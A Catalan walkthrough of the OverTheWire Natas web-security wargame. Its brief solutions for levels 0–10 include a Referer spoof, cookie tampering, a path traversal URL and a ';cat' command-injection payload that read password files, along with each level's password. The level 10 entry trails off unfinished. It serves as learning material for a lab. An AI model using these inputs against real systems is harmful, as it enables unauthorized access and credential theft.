# LEVEL 0

Inspeccionem l'element i podrem veure un comentari en el div "content", la password és:

```
g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```

# LEVEL 1

Al estar bloquejat el click dret fiquem 
view-source:http://natas1.natas.labs.overthewire.org/

```
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

# LEVEL 2

Inspeccionem i veiem que carrega una imatge i té la ruta de /files. Accedim i veiem que en aquest directori hi ha un fitxer users.txt

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# LEVEL 3

En el codi no trobem res, mirem el robots.txt i viem que surt /s3cr3t/ entrem en aquest directori i trobem el fitxer users.txt amb la password.

```
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

# LEVEL 4

Modifiquem la petició amb el BurpSuite ja que ens diu que només accepta peticions del natas5 i modifiquem el referer per http://natas5.natas.labs.overthewire.org/

```
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```


# LEVEL 5

Mirem la petició amb el BurpSuite, veiem que té un parametre que té el valor 0, li fiquem el valor 1 i ja podem entrar .Cookie: loggedin=0

```
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

# LEVEL 6

Si cliquem a view source, podem veure un tros de codi php on viem un include includes/secret.inc, aqui dins hi ha una variable amb la contrasenya que hem de ficar al input per poder obtenir la contrasenya del Natas7.
Fallo: secret de forma gloabal

```
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

# LEVEL 7

index.php?page= obre la pàgina, si mirem el codi veiem que el password esta /etc/natas_webpass/natas8
Fallo: path traversal

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8


```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```
# LEVEL 8

<?php
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

function decode($secret){
	return base64_decode(strrev(hex2bin($secret)));
}

echo (decode("3d3d516343746d4d6d6c315669563362"));

```
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```
# LEVEL 9
;cat /etc/natas_webpass/natas10

```
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

# LEVEL 10
a /etc/natas_webpass/natas10

natas









